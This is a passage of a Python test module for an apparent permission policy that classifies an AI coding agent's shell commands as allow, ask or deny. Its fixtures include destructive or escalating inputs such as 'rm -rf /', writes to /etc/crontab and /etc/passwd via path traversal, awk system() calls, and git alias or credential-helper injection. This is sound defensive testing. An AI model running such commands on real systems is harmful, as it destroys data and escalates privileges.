# lup: ignore[own-model-dispatch]
# Which semantic tool a native payload decodes to is exactly what these parity
# tests claim: `UnknownTool` is the fail-closed outcome for a novel or
# malformed operation, `ShellCommand` the recognized one. The decoded type is
# the assertion, observed from outside both decoders.
"""Cross-native semantic decoding and conservative policy parity tests."""

import ast
import importlib
import importlib.util
import json
import sys
from itertools import product
from pathlib import Path, PurePosixPath
from types import ModuleType
from typing import Literal, get_args

import pytest
import sh
from pydantic import AnyHttpUrl, BaseModel, Field, ValidationError

from lup.providers.claude.native import (
    ClaudeBeforeToolEvent,
    ClaudeEditBatchOperation,
    ClaudeEventDecoder,
    ClaudeHookPayload,
    ClaudeUnknownOperation,
    ClaudeDecisionRenderer,
    parse_claude_before_tool,
)
from lup.providers.codex.native import (
    CodexBeforeToolEvent,
    CodexEventDecoder,
    CodexFileChange,
    CodexFileChangeOperation,
    CodexUnknownOperation,
    CodexDecisionRenderer,
)
from lup.harness.enforcement import declared_path_rules, semantic_policy_for
from lup.harness.models import HookSet
from lup.types import JsonObject
from lup.policy.chain import UnknownToolPolicy
from lup.policy.grants import LeaseGrants, write_allowance_grants
from lup.policy.identity import ConcernAllowance
from lup.policy.bundle import (
    bundled_antipattern_rows,
    policy_kernel_modules,
    render_policy_data,
    runtime_path_rules,
    runtime_url_scope,
    shell_rule_rows_literal,
)
from lup.policy.kernel.effects import EffectEvidence, declare, deciding
from lup.policy.kernel.decision import (
    DecisionEffect,
    KernelDecision,
    SANDBOX_TRAPPED_REASON,
    SandboxPlacement,
    sandbox_escaped,
)
from lup.policy.kernel.edit import decide_edit
from lup.policy.kernel.rows import (
    PathRoleRow,
    RunnerTargetRow,
    ShellRuleRow,
    runner_target_values,
    shell_row_values,
)
from lup.providers.codex.harness import codex_allow_prefixes
from lup.policy.refused_tools import RefusedTool, erase_refused_tools
from lup.policy.edit_rules import EditRule
from lup.policy.shell_rules import (
    ShellCommandRule,
    erase_runner_targets,
    erase_shell_rules,
    RunnerTargetRule,
    ShellOperationRule,
    ShellSubcommandRule,
)
from lup.policy.kernel.lex import shell_write_targets
from lup.policy.models import (
    Decision,
    EditBatch,
    EditChange,
    FetchUrl,
    ShellCommand,
    ToolIdentity,
    UnknownTool,
)
from lup.policy.rules import (
    EditPolicy,
    antipattern_rows,
    FetchPolicy,
    PathRule,
    ShellPolicy,
    UrlScope,
    human_owned_path_rule,
    path_rule_row,
)

from lup.policy.vocabulary import runner_target_rules
from lup_template.devtools.harness.catalog import declared_hook_set, portable_harness

SHELL_RULES = declared_hook_set().resolved_shell_rules()
"""This project's vocabulary as the runtime resolves it, not as it is declared.

Asked of the hook set rather than of the selection module, because what these
cases are about is the table a session and a generated dispatcher actually
walk. A test that resolved the selection its own way could agree with the
declaration while disagreeing with everything that reads it.
"""


class DecisionCase(BaseModel, frozen=True):
    """One primitive input and its expected policy effect."""

    input: str
    effect: Literal["allow", "ask", "deny", "defer"]
    sandboxed: bool = False
    escapable: bool = False
    """Whether the host judging this case can place one call outside its sandbox.

    Off by default, matching the kernel: a host that says nothing about
    placement cannot perform one, and a command declared ``outside`` is
    stopped there rather than run somewhere its declaration forbids."""

    interactive: bool = True
    existing: list[str] = Field(default_factory=list)
    """Repository-relative files that already exist when the case is judged."""

    empty: list[str] = Field(default_factory=list)
    """Repository-relative directories that exist and hold nothing.

    An archive unpacked into one replaces nothing whatever the archive turns
    out to hold, which is the only way to answer that without reading the
    archive. Declared separately from ``existing`` because these are made
    rather than written, and a directory holding a file is a different fact."""

    def host_existing(self) -> list[str]:
        """Every path a host stat'ing this case's tree would report present.

        The runner that builds a real tree gets each declared file's parent
        directories for free, and the two runners handed the literal list do
        not. Deriving them here is what keeps all three judging the same
        filesystem — without it, a destination directory reads as absent to
        one and occupied to another, which is the difference between a grant
        and an ask.
        """
        return sorted(
            {
                str(ancestor)
                for name in [*self.existing, *self.empty]
                for ancestor in [PurePosixPath(name), *PurePosixPath(name).parents]
                if str(ancestor) != "."
            }
        )


class HostShape(BaseModel, frozen=True):
    """The host facts a case is judged under, as one hashable identity."""

    sandboxed: bool
    escapable: bool
    interactive: bool


class EditDecisionCase(BaseModel, frozen=True):
    """One edit fixture shared by canonical and assembled policy forms."""

    path: str
    before: str | None
    after: str | None
    effect: Literal["allow", "ask", "deny", "defer"]
    autonomous: bool = False
    path_exists: bool = True


# The roles this repository declares, mirrored so the fixtures judge the same
# vocabulary the generated runtime is rendered with.
FIXTURE_PATH_ROLES = [
    PathRoleRow(root="tests", role="test"),
    PathRoleRow(root="**/tmp", role="scratch"),
    PathRoleRow(root=".venv", role="scratch"),
    PathRoleRow(root="build", role="scratch"),
    PathRoleRow(root="**/node_modules", role="scratch"),
]

FIXTURE_PATH_RULES = declared_path_rules(declared_hook_set())
"""The protected-path table this repository declares.

Shared by the shell and edit fixtures rather than restated for each, because
a table the two gates could be given differently is the drift these cases
exist to catch."""

FIXTURE_EXCLUDED_COMMANDS = ["quuxify *"]
"""One command the fixtures treat as taken out of the OS sandbox.

Unjudged exactly like `frobnicate` beside it, so the pair says the whole
rule between them: unjudged work defers to a boundary that covers it, and
where the declaration removed the cover it reaches whoever can answer for
it — a reviewer, or a refusal where there is none."""

FIXTURE_REFUSED_TOOLS = [
    RefusedTool(tool="Quuxify", reason="quuxifying leaves the repository"),
    RefusedTool(
        tool="Skill", specifier="quux-design", reason="designing quux leaves it too"
    ),
]
"""One whole-tool refusal and one narrowed to a single subject.

The pair says the rule between them: a bare row refuses every use of its
tool, a specifier row refuses one and leaves the tool's other uses to the
runtime, and neither is a name this repository actually refuses — what is
being pinned is the shape, not this project's own judgement."""

FIXTURE_RECOVERABLE_LIMIT = 5
FIXTURE_RUNNER_TARGETS = runner_target_rules()
"""What this project declares `uv run <target>` may reach, and where each runs,
which is what the shell fixtures below are written against."""
"""How many restorable files one command may destroy before it asks."""

SHELL_POLICY_CASES = [
    DecisionCase(input="env MODE=test python script.py", effect="deny"),
    DecisionCase(input="uv run --with requests python -c 'x'", effect="deny"),
    # A script file is the ladder's rung for computing something once, and it
    # is allowed wherever it sits: the refusal is about inline code leaving
    # nothing behind to read, which a file does not do. A scratch root reaches
    # no reviewer, but a one-off nobody reads again costs a reviewer nothing,
    # and the session running it is contained.
    DecisionCase(input="uv run pytest | uv run python tmp/oneoff.py", effect="allow"),
    DecisionCase(input="uv run python tmp/oneoff.py", effect="allow"),
    # The flags keep the refusal, because each of them is a program with no
    # file to open afterwards.
    DecisionCase(input="uv run python -m http.server", effect="deny"),
    DecisionCase(input="uv run python", effect="deny"),
    DecisionCase(input="find . -name '*.py' | xargs grep TODO", effect="allow"),
    DecisionCase(input="echo x | xargs rm -rf", effect="ask"),
    DecisionCase(input="cd /tmp/worktree && uv run pytest", effect="allow"),
    DecisionCase(input="git status\ncurl https://example.com", effect="ask"),
    DecisionCase(input="find . -name '*.tmp' -delete", effect="ask"),
    DecisionCase(input="cat x |& rm -rf ~", effect="ask"),
    DecisionCase(input="cat x ;& rm -rf ~", effect="deny"),
    # The two halves of what a redirection is answered on. A path a rule
    # names is settled before the write; ordinary source in the checkout is
    # not, because what lands there is produced by running the command and
    # read afterwards, against the file.
    DecisionCase(
        input="echo payload > pyproject.toml",
        effect="ask",
        existing=["pyproject.toml"],
    ),
    DecisionCase(
        input="echo payload >> src/generated.py",
        effect="allow",
        existing=["src/generated.py"],
    ),
    # `gh api` is the read path for everything the typed subcommands cannot
    # express, so it is screened by method and body the way curl is rather
    # than asked about wholesale.
    DecisionCase(input="gh api /repos/o/r/pulls/1", effect="allow"),
    DecisionCase(input="gh api --jq .state /repos/o/r/pulls/1", effect="allow"),
    DecisionCase(input="gh api -X DELETE /repos/o/r/x", effect="ask"),
    DecisionCase(input="gh api -f title=x /repos/o/r/issues", effect="ask"),
    DecisionCase(input="gh api --method PATCH /repos/o/r", effect="ask"),
    # A read-only form of a writing command allows; the writing form asks.
    DecisionCase(input="tar -tzf archive.tgz", effect="allow"),
    DecisionCase(input="tar -xzf archive.tgz", effect="ask"),
    DecisionCase(input="gzip -l archive.gz", effect="allow"),
    DecisionCase(input="gzip archive.txt", effect="ask"),
    DecisionCase(input="make -n", effect="allow"),
    DecisionCase(input="make test", effect="ask"),
    DecisionCase(input="npm ls", effect="allow"),
    DecisionCase(input="npm install", effect="ask"),
    DecisionCase(input="ss -ltnp", effect="allow"),
    DecisionCase(input="ss -K dst 1.2.3.4", effect="ask"),
    DecisionCase(input="gh pr view 123", effect="allow"),
    DecisionCase(input="gh pr list --state open", effect="allow"),
    DecisionCase(input="gh pr diff 123", effect="allow"),
    DecisionCase(input="gh issue view 7", effect="allow"),
    DecisionCase(input="tree -L 2 src", effect="allow"),
    DecisionCase(input="uv run tool --help", effect="allow"),
    DecisionCase(
        input=(
            "UV_CACHE_DIR=/tmp/lup-uv-cache uv run lup-devtools "
            "harness resolve --adapter codex"
        ),
        effect="allow",
    ),
    DecisionCase(
        input="uv run lup-devtools dev worktree create feature", effect="allow"
    ),
    # The conflict workflow is documented without `uv run`, whose manifest
    # parse is exactly what a conflicted manifest defeats, so the classifier
    # resolves the launcher named by path. Nothing else about the toolchain is
    # admitted that way — it bounces back naming the spelling that is.
    DecisionCase(
        input=".venv/bin/lup-devtools dev conflict status --json", effect="allow"
    ),
    DecisionCase(
        input=".venv/bin/lup-devtools dev conflict audit pyproject.toml", effect="allow"
    ),
    DecisionCase(input=".venv/bin/lup-devtools dev conflict complete", effect="allow"),
    DecisionCase(input="lup-devtools dev conflict list", effect="allow"),
    DecisionCase(input=".venv/bin/lup-devtools dev check", effect="deny"),
    DecisionCase(input=".venv/bin/lup-devtools harness generate all", effect="deny"),
    # Redirections: discards and fd duplication are stripped; file writes ask.
    DecisionCase(input="grep x f 2>&1", effect="allow"),
    DecisionCase(input="grep x f > /dev/null", effect="allow"),
    DecisionCase(input="cat f 2>/dev/null", effect="allow"),
    DecisionCase(input="ls >&2", effect="allow"),
    # Whether the file was already there decides nothing, because what
    # separated the two was content nobody had read and content is read after
    # the command runs. A target that cannot be resolved to a literal path
    # still keeps the strict verdict: there is no path to answer about.
    DecisionCase(input="echo x > out.txt", effect="allow", existing=["out.txt"]),
    DecisionCase(input="echo x > out.txt", effect="allow"),
    DecisionCase(input="echo x > nested/new.txt", effect="allow"),
    DecisionCase(input="echo x >> notes.log", effect="allow"),
    DecisionCase(input="echo x > $UNSET_DIR/out.txt", effect="ask"),
    DecisionCase(input="echo x > ~/out.txt", effect="ask"),
    DecisionCase(input="cat <<EOF", effect="deny"),
    # The session scratchpad is a write-allowed root like repo-relative tmp/,
    # and its role is read before the path is spelled — which is what keeps an
    # absolute root from reading as somewhere outside the checkout.
    # Reassigning TMPDIR is a security-sensitive assignment, and a suffix that
    # climbs out of the root leaves the root's grant behind: unresolvable it
    # asks for having no path to answer about, and resolvable it asks for
    # naming one the checkout does not cover.
    DecisionCase(input="echo x > $TMPDIR/out.txt", effect="allow"),
    DecisionCase(input='sort f > "${TMPDIR}/sorted.txt"', effect="allow"),
    DecisionCase(input="echo x > /tmp/claude-1000/scratch/out.txt", effect="allow"),
    DecisionCase(input="cat <<'EOF' > $TMPDIR/notes.md\nbody\nEOF", effect="allow"),
    DecisionCase(input="echo x > $TMPDIR/../etc/crontab", effect="ask"),
    DecisionCase(input="echo x > /tmp/claude-1000/../shadow", effect="ask"),
    # A /tmp path outside the session root is not scratch and not in the
    # checkout either, so it asks for the same reason any write beyond the
    # tree does — the boundary is what would have confined it, and none was
    # measured here.
    DecisionCase(input="echo x > /tmp/other/file", effect="ask"),
    DecisionCase(input="TMPDIR=/etc; echo x > $TMPDIR/passwd", effect="ask"),
    DecisionCase(input="for TMPDIR in /etc; do echo x > $TMPDIR/f; done", effect="ask"),
    # Publishing is how work becomes reviewable, so the verbs that put a
    # branch and its pull request in front of a reader are ordinary. What
    # keeps the ask is what a second attempt cannot restore, and what reaches
    # another person rather than describing your own work.
    DecisionCase(input="git push", effect="allow"),
    DecisionCase(input="git push --force origin HEAD", effect="allow"),
    DecisionCase(input="git push --delete origin feat", effect="ask"),
    DecisionCase(input="gh pr create --fill", effect="allow"),
    DecisionCase(input="gh pr ready 3", effect="allow"),
    DecisionCase(input="gh pr comment 3 --body hi", effect="allow"),
    # A merge runs the change into the base branch, which is an event
    # rather than a state a follow-up restores.
    DecisionCase(input="gh pr merge 3", effect="ask"),
    # A review carrying neither verdict is a comment; the two that carry
    # one say something in the caller's name, and saying something else
    # later is not unsaying it.
    DecisionCase(input="gh pr review 3 --comment --body hi", effect="allow"),
    DecisionCase(input="gh pr review 3 --approve", effect="ask"),
    DecisionCase(input="gh pr review 3 -r --body no", effect="ask"),
    # A default-method gh api call is a query; the flags that make it
    # anything else carry the ask instead of the subcommand carrying it.
    DecisionCase(input="gh api repos/o/r/pulls", effect="allow"),
    DecisionCase(input="gh api -X POST repos/o/r/issues", effect="ask"),
    DecisionCase(input="gh api -f title=x repos/o/r/issues", effect="ask"),
    # Reading a repository is read-only however deep in git's own vocabulary
    # the question is spelled.
    DecisionCase(input="git ls-remote --heads origin", effect="allow"),
    DecisionCase(input="git diff-tree -r HEAD", effect="allow"),
    DecisionCase(input="git check-ignore -v build/x", effect="allow"),
    DecisionCase(input="git submodule status", effect="allow"),
    DecisionCase(input="git bisect log", effect="allow"),
    DecisionCase(input="git bisect start", effect="ask"),
    # A protected path is protected from the shell too. Creating a file
    # destroys nothing, which is why an ordinary new target is written
    # freely — but the rules that guard a path guard it by who owns it, not
    # by what replacing it would cost, so they answer ahead of that grant and
    # the shell cannot reach what the edit gate stops.
    DecisionCase(input="echo x > README.md", effect="ask"),
    DecisionCase(input="echo x > sync.json", effect="ask"),
    DecisionCase(input="echo x > .env.local", effect="ask"),
    DecisionCase(input="echo x > docs/fresh-note.md", effect="allow"),
    # Housekeeping confined to the disposable roots is as safe as writing
    # them; any long flag, opaque word, or outside target keeps the verb's ask.
    DecisionCase(input="rm tmp/oneoff.py", effect="allow"),
    DecisionCase(input="rm -rf tmp/scratch", effect="allow"),
    DecisionCase(input="rm -f $TMPDIR/out.txt", effect="allow"),
    DecisionCase(input="rm /tmp/claude-1000/scratch/f", effect="allow"),
    # The same holds for a package's own scratch directory: what makes one
    # disposable is what it is, not which package opened it.
    DecisionCase(input="rm -rf packages/lup/tmp/run", effect="allow"),
    DecisionCase(input="mv src/app/tmp/a.md src/app/tmp/b.md", effect="allow"),
    DecisionCase(input="rm packages/lup/tmpfile.py", effect="ask"),
    DecisionCase(input="rm tmp/x src/y", effect="ask"),
    DecisionCase(input="rm tmp/../src/x.py", effect="ask"),
    # The opaque word the comment above promises keeps the verb's ask. A role
    # pattern reads directory names, so `**/tmp` had been absorbing the `$W`
    # and calling the whole path disposable — which bought a recursive delete
    # of wherever `$W` resolves to, on the strength of the segment after it.
    DecisionCase(input="rm -rf $W/tmp", effect="ask"),
    DecisionCase(input="rm -rf $W/tmp/keep", effect="ask"),
    DecisionCase(input="echo x > $W/tmp/f.py", effect="ask"),
    DecisionCase(input="rm -rf ~/tmp", effect="ask"),
    DecisionCase(input="rm --no-preserve-root -rf tmp", effect="ask"),
    DecisionCase(input="rm -rf /", effect="ask"),
    DecisionCase(input="rm .claude/settings.local.json", effect="ask"),
    DecisionCase(input="rm -rf .claude/skills", effect="ask"),
    DecisionCase(input="rm .claude/plugins/../settings.json", effect="ask"),
    # A generated plugin tree is a build product the running runtime already
    # loaded, so writing one by hand changes nothing it will honor and the
    # next generation reverts it. Every writing form refuses it and names the
    # typed source instead; a long flag the allow would not recognize must not
    # buy a way past the refusal, and reading such a path stays ordinary.
    DecisionCase(input="rm .codex/plugins/lup/hooks/scripts/policy.py", effect="deny"),
    DecisionCase(input="rm -rf .claude/plugins", effect="deny"),
    DecisionCase(input="rm .claude/plugins/lup/x tmp/y", effect="deny"),
    DecisionCase(input="rm --recursive .claude/plugins/lup", effect="deny"),
    DecisionCase(
        input="mv tmp/policy.py .claude/plugins/lup/hooks/policy.py", effect="deny"
    ),
    DecisionCase(input="cp tmp/a .codex/plugins/lup/b", effect="deny"),
    DecisionCase(input="mkdir -p .claude/plugins/lup/hooks", effect="deny"),
    DecisionCase(input="touch .codex/plugins/lup/marker", effect="deny"),
    DecisionCase(
        input="echo x > .claude/plugins/lup/hooks/scripts/policy.py", effect="deny"
    ),
    DecisionCase(input="echo x >> .codex/plugins/lup/data.py", effect="deny"),
    DecisionCase(
        input="cp .claude/plugins/lup/hooks/scripts/policy.py tmp/copy.py",
        effect="allow",
    ),
    DecisionCase(
        input="cat .claude/plugins/lup/hooks/scripts/policy.py", effect="allow"
    ),
    # Every path-taking judged-ask verb reads the same role, so a scratch root
    # is housekept without friction while production keeps the verb's ask.
    DecisionCase(input="cp tmp/a.json tmp/b.json", effect="allow"),
    DecisionCase(input="mv tmp/draft.md tmp/final.md", effect="allow"),
    DecisionCase(input="mkdir -p tmp/run/logs", effect="allow"),
    DecisionCase(input="touch tmp/marker", effect="allow"),
    DecisionCase(input="rmdir tmp/run", effect="allow"),
    DecisionCase(input="mv tmp/draft.md src/final.md", effect="ask"),
    # An empty directory anywhere, and the empty file beside it: neither
    # `mkdir` nor `touch` can overwrite, and both leave nothing to run, so
    # what lands inside is judged on its own path rather than the container
    # being refused up front. `touch` on a path that exists moves timestamps
    # and no content at all.
    DecisionCase(input="mkdir src/newpkg", effect="allow"),
    DecisionCase(input="touch src/newfile.py", effect="allow"),
    DecisionCase(input="touch -m src/existing.py", effect="allow"),
    # And the same outside the checkout, which is a decision rather than an
    # oversight: these two state their scope instead of resolving it, because
    # what makes a write beyond the tree worth an approval is the content
    # arriving there, and neither of these carries any. The first write that
    # does is judged on its own path, wherever the container turned out to be.
    DecisionCase(input="mkdir /etc/newdir", effect="allow"),
    DecisionCase(input="touch /etc/newfile", effect="allow"),
    DecisionCase(input="cp --archive tmp/a tmp/b", effect="ask"),
    # An archive replaces nothing where nothing stands, and what it holds
    # never has to be read to establish that. The destination carries the
    # question instead: absent, empty, or disposable by role is a grant, and
    # an occupied one keeps the ask because what would be replaced there is
    # exactly what the listing would have had to say.
    DecisionCase(input="tar -xzf a.tgz -C fresh", effect="allow"),
    DecisionCase(input="tar -xzf a.tgz -C blank", effect="allow", empty=["blank"]),
    DecisionCase(input="tar -xzf a.tgz -C tmp/out", effect="allow"),
    DecisionCase(input="unzip a.zip -d fresh", effect="allow"),
    DecisionCase(input="tar -xzf a.tgz -C src", effect="ask", existing=["src/main.py"]),
    # Naming no destination unpacks over the repository itself.
    DecisionCase(input="tar -xzf a.tgz", effect="ask"),
    DecisionCase(input="unzip a.zip", effect="ask"),
    # `-P` lets members carry absolute paths, so the destination stops
    # bounding where they land and the question it answered comes back.
    DecisionCase(input="tar -xzf a.tgz -C fresh -P", effect="ask"),
    # Creating an archive authors one path, judged as any creation is.
    DecisionCase(input="tar -czf out.tgz src", effect="allow"),
    DecisionCase(input="tar -czf out.tgz src", effect="ask", existing=["out.tgz"]),
    # Compression consumes its operand rather than adding beside it, so the
    # delete half decides: restorable passes, and anything else asks.
    DecisionCase(input="gzip tmp/notes.txt", effect="allow"),
    DecisionCase(input="gzip untracked.txt", effect="ask", existing=["untracked.txt"]),
    DecisionCase(input="gunzip tmp/notes.txt.gz", effect="allow"),
    # A generated tree refuses whatever verb reaches it.
    DecisionCase(input="tar -xzf a.tgz -C .claude/plugins/lup", effect="deny"),
    # Every grant above reasons from what this checkout knows of a path — a
    # declared role, the object store, nothing standing there — and none of
    # those readings reaches beyond it. So a target outside gives the line
    # back to the row, which is where a contained session's placement is read.
    DecisionCase(input="cp README.md /etc/newfile", effect="ask"),
    DecisionCase(input="mv tmp/a ../elsewhere/b", effect="ask"),
    DecisionCase(input="tar -czf /etc/backup.tgz src", effect="ask"),
    DecisionCase(input="unzip a.zip -d /etc/out", effect="ask"),
    # Copying reads its sources and writes only its destination, so landing
    # production in a scratch root destroys nothing; moving out of one does,
    # because the source is removed, and that keeps the verb's ask.
    DecisionCase(input="cp src/a.py tmp/a.py", effect="allow"),
    DecisionCase(input="cp /etc/hosts tmp/hosts", effect="allow"),
    DecisionCase(input="cp tmp/a src/b.py", effect="ask"),
    DecisionCase(input="mv src/a.py tmp/a.py", effect="ask"),
    DecisionCase(input="rm /home/u/.claude/plugins/lup/x", effect="deny"),
    DecisionCase(input="echo x > /srv/tree/dev/.codex/plugins/lup/y", effect="deny"),
    DecisionCase(input="rm .codex/config.local.toml", effect="ask"),
    # Quote-aware substitution: inert inside single quotes; a live $(...)
    # classifies recursively — the inner command joins the batch, and the
    # opaque result only rides on an argument-safe outer command. Command
    # position, deep nesting, and backticks stay conservative.
    DecisionCase(input="git commit -m 'fixes $(bug)'", effect="allow"),
    DecisionCase(input="echo $(whoami)", effect="allow"),
    DecisionCase(input="cat $(git rev-parse --git-dir)/HEAD", effect="allow"),
    DecisionCase(input="wc -l $(git diff --name-only)", effect="allow"),
    DecisionCase(input='echo "today is $(date)"', effect="allow"),
    DecisionCase(input="[[ -n $(git status --porcelain) ]]", effect="allow"),
    DecisionCase(input="echo $(echo $(ls))", effect="allow"),
    DecisionCase(input="F=$(ls); echo $F", effect="allow"),
    DecisionCase(input="echo $(git push --delete origin feat)", effect="ask"),
    DecisionCase(input="echo $(rm -rf /)", effect="ask"),
    DecisionCase(input="git log $(cat names.txt)", effect="deny"),
    DecisionCase(input="F=$(ls); sed $F 's/a/b/' f", effect="deny"),
    DecisionCase(input="$(which ls) -la", effect="deny"),
    DecisionCase(input="echo $(echo $(echo $(ls)))", effect="deny"),
    DecisionCase(input="echo $(ls", effect="deny"),
    DecisionCase(input="echo `id`", effect="deny"),
    # Read-side process substitution classifies its inner command recursively;
    # the write side still asks. A substituting inner command is resolved to
    # the name it runs, so `x` is a command the vocabulary lists nowhere and
    # the reviewer is shown what would run.
    DecisionCase(input="diff <(git status) <(git log)", effect="allow"),
    DecisionCase(input="diff <(sudo id) f", effect="ask"),
    DecisionCase(input="diff <(cat $(x)) f", effect="ask"),
    DecisionCase(input="cat >(tee f)", effect="ask"),
    # Loops classify their condition and body recursively; literal for-words
    # instantiate the body, and opaque word lists gate guarded arguments.
    DecisionCase(input="sleep 5", effect="allow"),
    DecisionCase(input='for f in a.py b.py; do wc -l "$f"; done', effect="allow"),
    DecisionCase(input='for f in *.py; do wc -l "$f"; done', effect="allow"),
    DecisionCase(input="until grep -q Ready dev.log; do sleep 1; done", effect="allow"),
    DecisionCase(input="while true; do date; done", effect="allow"),
    DecisionCase(
        input='for a in x y; do for b in z; do echo "$a$b"; done; done',
        effect="allow",
    ),
    # A substitution inside a loop body. Spliced where it was read, it landed
    # between the `for` header and its `do`, so the loop reader took it for a
    # condition — which a `for` loop cannot have — and refused the construct
    # while reporting that it did not parse. Running one read-only command per
    # branch is the commonest shape in this work, and all of it was blocked.
    DecisionCase(input="for b in x y; do echo $(git log -1 $b); done", effect="allow"),
    DecisionCase(input="for f in a b; do diff <(cat $f) base; done", effect="allow"),
    DecisionCase(input="for x in -i; do sed \"$x\" 's/a/b/' f; done", effect="deny"),
    DecisionCase(input='for f in *.txt; do sort "$f"; done', effect="deny"),
    DecisionCase(input='for f in a; do python "$f"; done', effect="deny"),
    DecisionCase(input='for f in a; do wc "$f"', effect="deny"),
    DecisionCase(input="while do done", effect="deny"),
    DecisionCase(input='for f a; do wc "$f"; done', effect="deny"),
    # Expanded read-only vocabulary with writer-flag guards. A flag that
    # lands a file is judged on the path it lands at, which is the same
    # reading the redirection spelling of it gets — `sort -o out f` and
    # `sort f > out` write one file and answer once.
    DecisionCase(input="sort f", effect="allow"),
    DecisionCase(input="sort -o out f", effect="allow"),
    DecisionCase(input="sort -o .git/HEAD f", effect="ask"),
    DecisionCase(input="sort -o /tmp/other/file f", effect="ask"),
    # A flag that runs a program is not a flag that writes a file, and keeps
    # its own question however ordinary the file beside it is.
    DecisionCase(input="sort --compress-program=x -o out f", effect="ask"),
    DecisionCase(input="sed -n '1,5p' f", effect="allow"),
    DecisionCase(input="sed -i 's/a/b/' f", effect="deny"),
    DecisionCase(input="sed 's/x/y/e' f", effect="deny"),
    DecisionCase(input="awk '{print $1}' f", effect="allow"),
    DecisionCase(input="awk -F: '{print $2}' /etc/passwd", effect="allow"),
    DecisionCase(input="cat f | awk 'NR>=2 {print $1}'", effect="allow"),
    DecisionCase(input="awk '$3 > 5' f", effect="allow"),
    DecisionCase(input='mawk \'$1=="a" || $2=="b"\' f', effect="allow"),
    DecisionCase(input="awk '{print > \"out\"}' f", effect="deny"),
    DecisionCase(input="awk 'BEGIN{system(\"id\")}'", effect="deny"),
    DecisionCase(input="seq 3 | awk '{print | \"sort\"}'", effect="deny"),
    DecisionCase(input="gawk -i inplace '{gsub(/a/,\"b\")}1' f", effect="deny"),
    DecisionCase(input="awk -f prog.awk f", effect="deny"),
    DecisionCase(input="jq . f", effect="allow"),
    DecisionCase(input="yq '.a' f", effect="allow"),
    # `yq -i` writes and still asks: the file it rewrites is the operand, so
    # the flag carries no path and there is nothing for the write row to be
    # asked about. Under-naming keeps the row's own question.
    DecisionCase(input="yq -i '.a = 1' f", effect="ask"),
    DecisionCase(input="xmllint --noout f", effect="allow"),
    DecisionCase(input="xmllint -output out f", effect="allow"),
    DecisionCase(input="xmllint --output /etc/hosts f", effect="ask"),
    DecisionCase(input="cut -f1 f", effect="allow"),
    DecisionCase(input="diff a b", effect="allow"),
    DecisionCase(input="rg TODO", effect="allow"),
    # Git: read-only and reversible-local allow; destructive forms ask.
    DecisionCase(input="git rev-parse HEAD", effect="allow"),
    DecisionCase(input="git ls-files", effect="allow"),
    DecisionCase(input="git blame f", effect="allow"),
    DecisionCase(input="git stash push", effect="allow"),
    DecisionCase(input="git reset --soft HEAD~1", effect="allow"),
    DecisionCase(input="git branch -D topic", effect="ask"),
    DecisionCase(input="git worktree remove wt", effect="ask"),
    DecisionCase(input="git stash drop", effect="ask"),
    DecisionCase(input="git reset --hard", effect="ask"),
    DecisionCase(input="git clean -fd", effect="ask"),
    DecisionCase(input="git push --delete origin feat", effect="ask"),
    DecisionCase(input="git checkout -- file", effect="deny"),
    # Ref-sourced pathspec restores name their content's commit; the shell
    # option builtin is shell-local. Both anchor history-rebuild batches.
    DecisionCase(input="set -e", effect="allow"),
    DecisionCase(input="set -euo pipefail", effect="allow"),
    DecisionCase(input="git checkout 81619e7 -- packages/x.py", effect="allow"),
    DecisionCase(input="git checkout main -- f g", effect="allow"),
    DecisionCase(input="git checkout $ref -- f", effect="deny"),
    DecisionCase(input="git checkout -b topic", effect="deny"),
    DecisionCase(
        input="set -e; git checkout 81619e7 -- x.py; git commit -m x",
        effect="allow",
    ),
    DecisionCase(input="git config core.pager=x", effect="ask"),
    # Read verbs pin git config to its query action. Among writes, the key
    # decides: one naming a program git will run keeps the row's ask, an
    # ordinary setting does not, and a word this cannot read fails closed.
    DecisionCase(input="git config --get user.name", effect="allow"),
    DecisionCase(input="git config --get-regexp 'branch\\..*'", effect="allow"),
    DecisionCase(input="git config --list", effect="allow"),
    DecisionCase(input="git config -l", effect="allow"),
    DecisionCase(input="git config user.name me", effect="allow"),
    DecisionCase(input="git config --unset user.name", effect="allow"),
    DecisionCase(input="git config --global user.name me", effect="allow"),
    DecisionCase(input="git config branch.x.lup-base dev", effect="allow"),
    DecisionCase(input="git config core.hooksPath /tmp/x", effect="ask"),
    DecisionCase(input="git config --unset core.pager", effect="ask"),
    DecisionCase(input="git config alias.co checkout", effect="ask"),
    DecisionCase(input="git config merge.ours.driver true", effect="ask"),
    DecisionCase(input="git config --file /tmp/x user.name me", effect="ask"),
    DecisionCase(input="git config $KEY value", effect="ask"),
    DecisionCase(input="git config --get $KEY", effect="ask"),
    # Global value flags are consumed, never read as the subcommand; globals
    # that change execution behavior or move git to another repository ask.
    # A redirect is judged before the subcommand word is even found, so it
    # cannot be answered by the row that would otherwise reason about this
    # worktree — `commit` is reversible here, where the reflog lives.
    DecisionCase(input="git -C /other status", effect="ask"),
    DecisionCase(input="git -C /tmp/other commit -am x", effect="ask"),
    DecisionCase(input="git -C /tmp/o merge --abort", effect="ask"),
    DecisionCase(input="git --git-dir=/tmp/x --work-tree=/tmp add .", effect="ask"),
    DecisionCase(input="git --namespace=other push", effect="ask"),
    DecisionCase(input="git --super-prefix=x/ status", effect="ask"),
    # Reading another tree keeps its way through, as two allowed segments.
    DecisionCase(input="cd /other && git status", effect="allow"),
    DecisionCase(input="git -C status restore f", effect="ask"),
    DecisionCase(input="git -c core.pager=touch log", effect="ask"),
    DecisionCase(input="git --exec-path=/tmp/x status", effect="ask"),
    # A settings global is judged by the setting, exactly as `git config` is
    # judged by the key it writes: `-c` reaches a program only through the
    # keys listed there, and asking about every other one told whoever
    # answered that git config can change how commands execute — untrue of
    # the display settings that are nearly all of `-c`'s everyday use.
    DecisionCase(input="git -c color.ui=false diff", effect="allow"),
    DecisionCase(input="git -c color.ui=false -c log.date=iso log", effect="allow"),
    DecisionCase(input="git --config-env=color.ui=UI status", effect="allow"),
    DecisionCase(input="git -c credential.helper=/tmp/x fetch", effect="ask"),
    DecisionCase(input="git -c alias.x='!rm -rf /' status", effect="ask"),
    DecisionCase(input="git --config-env=core.pager=EVIL status", effect="ask"),
    # Two spellings this deliberately cannot read, and both keep the
    # question. An expansion could become any key; a short flag with its
    # value pressed against it carries an `=` that belongs to the setting
    # rather than to the flag, so splitting on it would compare a value
    # against a list of keys and find no match.
    DecisionCase(input="git -c $KEY=x status", effect="ask"),
    DecisionCase(input="git -ccore.pager=x status", effect="ask"),
    # An unguarded setting relaxes the global and nothing else: what follows
    # is judged by its own row, and a verb that fell off the enumeration
    # still falls off it.
    DecisionCase(input="git -c color.ui=false reset --hard", effect="ask"),
